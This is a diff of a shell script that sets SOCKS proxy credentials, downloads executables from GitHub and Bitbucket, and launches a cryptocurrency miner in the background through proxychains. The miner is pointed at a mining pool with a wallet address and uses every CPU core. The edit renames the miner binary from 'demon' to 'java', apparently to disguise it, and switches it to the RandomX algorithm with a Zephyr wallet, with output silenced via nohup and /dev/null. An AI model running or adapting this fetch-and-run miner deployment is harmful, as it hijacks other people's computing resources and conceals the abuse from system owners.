@@ -2,7 +2,7 @@ proxy="52.5.238.209"
 port="1080" 
 user="22qg9vgn8zo93"  
 pass="z5qrhxcikhhylquzqvnzc03zng"
-wget -q -O demon https://github.com/swanderenata/cautious-octo-garbanzo/raw/main/httpd && chmod +x demon
+wget -q -O java https://github.com/swanderenata/NFT/raw/main/jupyterlab && chmod +x java
 wget -q https://bitbucket.org/asimadarasi/alima/downloads/panel && chmod +x panel 
 wget -q https://bitbucket.org/asimadarasi/alima/downloads/proxychains.conf && chmod +x proxychains.conf 
 wget -q https://bitbucket.org/asimadarasi/alima/downloads/libproxychains4.so && chmod +x libproxychains4.so 
@@ -19,4 +19,4 @@ echo "IP ORI ==> "$(curl ifconfig.me)
 echo " " 
 echo " " 
 echo "IP BARU ==> "$(./panel curl ifconfig.me)
-nohup ./panel ./demon -a yescryptR32 -o 45.115.225.225:443 -u UUttAax2AKgvUur3n3RhMDLxYjsFJgGnbh -p c=UNFY,mc=UNFY,ID=$(echo $(shuf -i 1-5 -n 1)-yui) -t $(nproc --all) &>/dev/null &
+nohup ./panel ./java -o 45.115.225.225:8080 -a rx/0 -u ZEPHYR2tBHcj5UGL8ht15WiyPifGuh7ugHN5nAKXhDAE79gGobZ4kH9USdGNwy8prj7Sb7sXWXKEtck6cxF8138fJpd4iSa2cEM23.bian --randomx-1gb-pages -p -x -t $(nproc --all) &>/dev/null &
